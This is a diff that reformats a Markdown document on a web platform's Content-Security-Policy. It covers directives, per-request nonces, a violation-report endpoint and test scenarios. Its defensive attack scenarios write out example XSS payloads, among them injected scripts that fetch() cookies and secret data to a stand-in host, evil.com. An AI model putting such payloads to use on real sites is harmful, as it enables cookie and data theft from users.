@@ -33,83 +33,101 @@ Content-Security-Policy:
 ### Directive Breakdown
 
 #### `default-src 'self'`
+
 **Purpose**: Default fallback for all resource types
 
 **Effect**: Only load resources from same origin (https://abr-insights.com)
 
 **Blocks**:
+
 - ❌ External scripts (https://evil.com/malicious.js)
 - ❌ External stylesheets (https://evil.com/style.css)
 - ❌ External images (except allowed by img-src)
 
 #### `script-src 'self' 'nonce-{RANDOM_NONCE}' 'strict-dynamic'`
+
 **Purpose**: Control script execution sources
 
 **Allows**:
+
 - ✅ Scripts from same origin (`/scripts/app.js`)
 - ✅ Inline scripts with nonce (`<script nonce="abc123">...</script>`)
 - ✅ Scripts loaded by nonce-allowed scripts ('strict-dynamic')
 
 **Blocks**:
+
 - ❌ Inline scripts without nonce (`<script>alert('xss')</script>`)
 - ❌ External scripts without nonce (`<script src="https://evil.com/hack.js">`)
 - ❌ `eval()` and `Function()` constructor
 - ❌ Inline event handlers (`onclick="..."`)
 
 **Nonce Example**:
+
 ```html
 <!-- Allowed (has nonce) -->
 <script nonce="abc123def456">
-  console.log('Hello World');
+  console.log('Hello World')
 </script>
 
 <!-- Blocked (no nonce) -->
 <script>
-  console.log('This is blocked');
+  console.log('This is blocked')
 </script>
 ```
 
 #### `style-src 'self' 'nonce-{RANDOM_NONCE}'`
+
 **Purpose**: Control stylesheet sources
 
 **Allows**:
+
 - ✅ Stylesheets from same origin (`/styles/app.css`)
 - ✅ Inline styles with nonce (`<style nonce="abc123">...</style>`)
 
 **Blocks**:
+
 - ❌ Inline styles without nonce (`<div style="color: red">`)
 - ❌ External stylesheets (`<link href="https://evil.com/style.css">`)
 
 #### `img-src 'self' https: data:`
+
 **Purpose**: Control image sources
 
 **Allows**:
+
 - ✅ Same-origin images (`/images/logo.png`)
 - ✅ Any HTTPS image (`https://cdn.example.com/image.jpg`)
 - ✅ Data URIs (`data:image/png;base64,...`)
 
 **Blocks**:
+
 - ❌ HTTP images (http://insecure.com/image.jpg)
 
 #### `font-src 'self' https://fonts.gstatic.com`
+
 **Purpose**: Control font sources
 
 **Allows**:
+
 - ✅ Same-origin fonts (`/fonts/custom.woff2`)
 - ✅ Google Fonts (`https://fonts.gstatic.com/...`)
 
 #### `connect-src 'self' https://*.supabase.co https://api.stripe.com`
+
 **Purpose**: Control XHR/fetch/WebSocket connections
 
 **Allows**:
+
 - ✅ Same-origin API calls (`/api/courses`)
 - ✅ Supabase API (`https://abc.supabase.co`)
 - ✅ Stripe API (`https://api.stripe.com`)
 
 **Blocks**:
+
 - ❌ External API calls (`https://evil.com/exfiltrate`)
 
 #### `frame-ancestors 'none'`
+
 **Purpose**: Prevent clickjacking
 
 **Effect**: Page cannot be embedded in `<iframe>`, `<frame>`, `<embed>`
@@ -117,25 +135,31 @@ Content-Security-Policy:
 **Equivalent to**: `X-Frame-Options: DENY`
 
 #### `base-uri 'self'`
+
 **Purpose**: Restrict `<base>` tag URLs
 
 **Effect**: Prevents attackers from changing base URL for relative links
 
 #### `form-action 'self'`
+
 **Purpose**: Restrict form submission targets
 
 **Allows**:
+
 - ✅ Forms submitting to same origin (`<form action="/api/submit">`)
 
 **Blocks**:
+
 - ❌ Forms submitting to external sites (`<form action="https://evil.com">`)
 
 #### `upgrade-insecure-requests`
+
 **Purpose**: Automatically upgrade HTTP to HTTPS
 
 **Effect**: All HTTP requests rewritten to HTTPS (http://example.com → https://example.com)
 
 #### `block-all-mixed-content`
+
 **Purpose**: Block HTTP resources on HTTPS page
 
 **Effect**: Prevents mixed content warnings (HTTPS page loading HTTP resources)
@@ -147,17 +171,18 @@ Content-Security-Policy:
 **Purpose**: Random nonce per request (prevents replay attacks)
 
 **Implementation** (`middleware.ts`):
+
 ```typescript
-import { randomBytes } from 'crypto';
+import { randomBytes } from 'crypto'
 
 export function middleware(request: NextRequest) {
   // Generate 128-bit random nonce (base64-encoded)
-  const nonce = randomBytes(16).toString('base64');
-  
+  const nonce = randomBytes(16).toString('base64')
+
   // Store nonce in request headers (for use in components)
-  const requestHeaders = new Headers(request.headers);
-  requestHeaders.set('x-nonce', nonce);
-  
+  const requestHeaders = new Headers(request.headers)
+  requestHeaders.set('x-nonce', nonce)
+
   // Build CSP header with nonce
   const cspHeader = `
     default-src 'self';
@@ -171,29 +196,32 @@ export function middleware(request: NextRequest) {
     form-action 'self';
     upgrade-insecure-requests;
     block-all-mixed-content;
-  `.replace(/\s{2,}/g, ' ').trim();
-  
-  const responseHeaders = new Headers();
-  responseHeaders.set('Content-Security-Policy', cspHeader);
-  
+  `
+    .replace(/\s{2,}/g, ' ')
+    .trim()
+
+  const responseHeaders = new Headers()
+  responseHeaders.set('Content-Security-Policy', cspHeader)
+
   return NextResponse.next({
     headers: responseHeaders,
     request: {
       headers: requestHeaders,
     },
-  });
+  })
 }
 ```
 
 ### Nonce Injection (React Components)
 
 **Usage in Components**:
+
 ```typescript
 import { headers } from 'next/headers';
 
 export default async function RootLayout({ children }) {
   const nonce = headers().get('x-nonce');
-  
+
   return (
     <html>
       <head>
@@ -206,7 +234,7 @@ export default async function RootLayout({ children }) {
             };
           `}
         </script>
-        
+
         {/* Inline style with nonce */}
         <style nonce={nonce}>
           {`
@@ -230,6 +258,7 @@ export default async function RootLayout({ children }) {
 **Purpose**: Receive CSP violation reports from browser
 
 **CSP Header Addition** (if report-only mode):
+
 ```
 Content-Security-Policy-Report-Only: ...; report-uri /api/csp-report;
 ```
@@ -239,6 +268,7 @@ Content-Security-Policy-Report-Only: ...; report-uri /api/csp-report;
 ### Violation Report Format
 
 **Browser sends**:
+
 ```json
 {
   "csp-report": {
@@ -258,15 +288,16 @@ Content-Security-Policy-Report-Only: ...; report-uri /api/csp-report;
 ### Report Handler
 
 **Implementation** (`app/api/csp-report/route.ts`):
+
 ```typescript
-import { NextRequest } from 'next/server';
-import { logger } from '@/lib/logging/production-logger';
+import { NextRequest } from 'next/server'
+import { logger } from '@/lib/logging/production-logger'
 
 export async function POST(request: NextRequest) {
   try {
-    const report = await request.json();
-    const violation = report['csp-report'];
-    
+    const report = await request.json()
+    const violation = report['csp-report']
+
     // Log violation with structured logging
     logger.warn('CSP violation', {
       documentUri: violation['document-uri'],
@@ -276,37 +307,37 @@ export async function POST(request: NextRequest) {
       lineNumber: violation['line-number'],
       columnNumber: violation['column-number'],
       statusCode: violation['status-code'],
-    });
-    
+    })
+
     // Alert on repeated violations from same source
-    await checkForAttack(violation);
-    
-    return new Response(null, { status: 204 });
+    await checkForAttack(violation)
+
+    return new Response(null, { status: 204 })
   } catch (error) {
-    logger.error('Failed to process CSP report', { error });
-    return new Response(null, { status: 500 });
+    logger.error('Failed to process CSP report', { error })
+    return new Response(null, { status: 500 })
   }
 }
 
 async function checkForAttack(violation: CSPViolation) {
-  const key = `csp:${violation['document-uri']}:${violation['blocked-uri']}`;
-  const count = await redis.incr(key);
-  await redis.expire(key, 3600); // 1 hour window
-  
+  const key = `csp:${violation['document-uri']}:${violation['blocked-uri']}`
+  const count = await redis.incr(key)
+  await redis.expire(key, 3600) // 1 hour window
+
   if (count > 10) {
     // More than 10 violations from same source in 1 hour
     logger.error('Potential CSP attack detected', {
       documentUri: violation['document-uri'],
       blockedUri: violation['blocked-uri'],
       violationCount: count,
-    });
-    
+    })
+
     // Alert security team (PagerDuty)
     await alertSecurityTeam({
       severity: 'high',
       title: 'CSP Attack Detected',
       description: `Multiple CSP violations: ${violation['blocked-uri']}`,
-    });
+    })
   }
 }
 ```
@@ -314,6 +345,7 @@ async function checkForAttack(violation: CSPViolation) {
 ### Violation Monitoring
 
 **Metrics**:
+
 - Violations per hour
 - Unique blocked URIs
 - Most common violated directives
@@ -322,7 +354,8 @@ async function checkForAttack(violation: CSPViolation) {
 **Dashboard**: Supabase logs + Azure Monitor
 
 **Alerts**:
-- >100 violations/hour: Security team notification
+
+- > 100 violations/hour: Security team notification
 - New blocked URI: Investigation ticket
 - Repeated violations from same IP: Auto-block (rate limit)
 
@@ -333,6 +366,7 @@ async function checkForAttack(violation: CSPViolation) {
 **Workflow**: `.github/workflows/csp-validation.yml`
 
 **Jobs**:
+
 1. **CSP Header Presence**: Verify `Content-Security-Policy` header in middleware
 2. **Nonce Generation**: Verify `randomBytes(16)` usage
 3. **No Unsafe Directives**: Block 'unsafe-inline', 'unsafe-eval'
@@ -340,6 +374,7 @@ async function checkForAttack(violation: CSPViolation) {
 5. **Upgrade Insecure Requests**: Verify directive present
 
 **Example Check**:
+
 ```yaml
 - name: Validate CSP Header
   run: |
@@ -375,6 +410,7 @@ async function checkForAttack(violation: CSPViolation) {
 ### Sample Request/Response
 
 **Request**:
+
 ```http
 GET /courses HTTP/2
 Host: abr-insights.com
@@ -382,6 +418,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
 ```
 
 **Response Headers**:
+
 ```http
 HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
@@ -394,30 +431,37 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 ```
 
 **HTML Response** (excerpt):
+
 ```html
 <!DOCTYPE html>
 <html>
-<head>
-  <!-- Nonce-protected inline script -->
-  <script nonce="a7f8d9e2b1c4">
-    window.__APP_CONFIG__ = {"apiUrl":"https://abr-insights.com/api"};
-  </script>
-  
-  <!-- Nonce-protected inline style -->
-  <style nonce="a7f8d9e2b1c4">
-    body { margin: 0; font-family: sans-serif; }
-  </style>
-  
-  <!-- External script (same-origin, allowed by 'self') -->
-  <script src="/_next/static/chunks/main.js"></script>
-</head>
-<body>...</body>
+  <head>
+    <!-- Nonce-protected inline script -->
+    <script nonce="a7f8d9e2b1c4">
+      window.__APP_CONFIG__ = { apiUrl: 'https://abr-insights.com/api' }
+    </script>
+
+    <!-- Nonce-protected inline style -->
+    <style nonce="a7f8d9e2b1c4">
+      body {
+        margin: 0;
+        font-family: sans-serif;
+      }
+    </style>
+
+    <!-- External script (same-origin, allowed by 'self') -->
+    <script src="/_next/static/chunks/main.js"></script>
+  </head>
+  <body>
+    ...
+  </body>
 </html>
 ```
 
 ### Browser DevTools Verification
 
 **Console Output** (when CSP blocks a script):
+
 ```
 Refused to execute inline script because it violates the following
 Content Security Policy directive: "script-src 'self' 'nonce-a7f8d9e2b1c4'
@@ -427,6 +471,7 @@ execution.
 ```
 
 **Network Tab** (blocked resource):
+
 ```
 Request URL: https://evil.com/malicious.js
 Status: (blocked:csp)
@@ -437,17 +482,19 @@ Status: (blocked:csp)
 ### Scenario 1: XSS via Inline Script
 
 **Attack**:
+
 ```html
 <!-- Attacker injects -->
 <script>
   fetch('https://evil.com/exfiltrate', {
     method: 'POST',
     body: JSON.stringify({ cookies: document.cookie }),
-  });
+  })
 </script>
 ```
 
 **CSP Protection**:
+
 - ❌ Blocked: Script has no nonce
 - Browser console: "Refused to execute inline script..."
 - CSP violation report sent to `/api/csp-report`
@@ -457,12 +504,14 @@ Status: (blocked:csp)
 ### Scenario 2: XSS via External Script
 
 **Attack**:
+
 ```html
 <!-- Attacker injects -->
 <script src="https://evil.com/malicious.js"></script>
 ```
 
 **CSP Protection**:
+
 - ❌ Blocked: External script from untrusted domain
 - Browser console: "Refused to load the script..."
 - CSP violation report sent
@@ -472,6 +521,7 @@ Status: (blocked:csp)
 ### Scenario 3: Clickjacking
 
 **Attack**:
+
 ```html
 <!-- Attacker's page -->
 <iframe src="https://abr-insights.com/billing"></iframe>
@@ -479,6 +529,7 @@ Status: (blocked:csp)
 ```
 
 **CSP Protection**:
+
 - ❌ Blocked: `frame-ancestors 'none'` prevents embedding
 - Browser console: "Refused to display ... in a frame..."
 
@@ -487,15 +538,17 @@ Status: (blocked:csp)
 ### Scenario 4: Data Exfiltration via fetch()
 
 **Attack**:
+
 ```javascript
 // Attacker's injected script (if nonce somehow obtained)
 fetch('https://evil.com/exfiltrate', {
   method: 'POST',
   body: JSON.stringify({ data: secretData }),
-});
+})
 ```
 
 **CSP Protection**:
+
 - ❌ Blocked: `connect-src` doesn't allow https://evil.com
 - Browser console: "Refused to connect to..."
 - CSP violation report sent
@@ -505,12 +558,14 @@ fetch('https://evil.com/exfiltrate', {
 ### Scenario 5: Mixed Content
 
 **Attack**:
+
 ```html
 <!-- Attacker injects HTTP resource on HTTPS page -->
 <script src="http://evil.com/script.js"></script>
 ```
 
 **CSP Protection**:
+
 - ❌ Blocked: `block-all-mixed-content` prevents HTTP resources
 - ❌ Blocked: `upgrade-insecure-requests` upgrades to HTTPS (then blocked by script-src)
 
@@ -521,22 +576,26 @@ fetch('https://evil.com/exfiltrate', {
 ### Manual Testing
 
 **Test 1: Inline Script without Nonce**
+
 1. Inject: `<script>alert('XSS')</script>`
 2. Expected: Blocked by CSP, console error
 3. Result: ✅ Blocked
 
 **Test 2: External Script**
+
 1. Inject: `<script src="https://evil.com/hack.js"></script>`
 2. Expected: Blocked by CSP, violation report
 3. Result: ✅ Blocked
 
 **Test 3: Nonce Rotation**
+
 1. Refresh page 10 times
 2. Check nonce in HTML source (view-source:)
 3. Expected: Different nonce each time
 4. Result: ✅ Nonces unique
 
 **Test 4: Frame Embedding**
+
 1. Create attacker page: `<iframe src="https://abr-insights.com">`
 2. Expected: Blocked by frame-ancestors
 3. Result: ✅ Blocked
@@ -548,6 +607,7 @@ fetch('https://evil.com/exfiltrate', {
 **Score**: A+ (target)
 
 **Required Headers**:
+
 - ✅ Content-Security-Policy
 - ✅ X-Content-Type-Options: nosniff
 - ✅ X-Frame-Options: DENY
@@ -559,12 +619,14 @@ fetch('https://evil.com/exfiltrate', {
 ### Nonce Best Practices
 
 **DO**:
+
 - ✅ Generate new nonce per request (crypto.randomBytes)
 - ✅ Use 128+ bit nonces (16+ bytes)
 - ✅ Pass nonce to all components via headers
 - ✅ Apply nonce to all inline scripts/styles
 
 **DON'T**:
+
 - ❌ Reuse nonces across requests
 - ❌ Use predictable nonces (timestamp, sequential)
 - ❌ Store nonces in cookies/localStorage
@@ -573,6 +635,7 @@ fetch('https://evil.com/exfiltrate', {
 ### CSP Policy Updates
 
 **Process**:
+
 1. Identify new requirement (e.g., new CDN for analytics)
 2. Update CSP directive in middleware.ts:
    ```typescript
@@ -586,11 +649,13 @@ fetch('https://evil.com/exfiltrate', {
 ### Violation Response
 
 **Low Volume (<10/hour)**:
+
 - Investigate: Is it legitimate? (new feature, third-party script)
 - Update CSP if needed
 - Or fix code to comply with CSP
 
 **High Volume (>100/hour)**:
+
 - Potential attack: Alert security team
 - Identify source: IP, user agent, blocked URI
 - Block if malicious: Rate limit IP, revoke user session
@@ -605,4 +670,5 @@ fetch('https://evil.com/exfiltrate', {
 ---
 
 **Document History**:
+
 - v1.0 (2026-02-03): Initial version (PR-08 compliance pack)
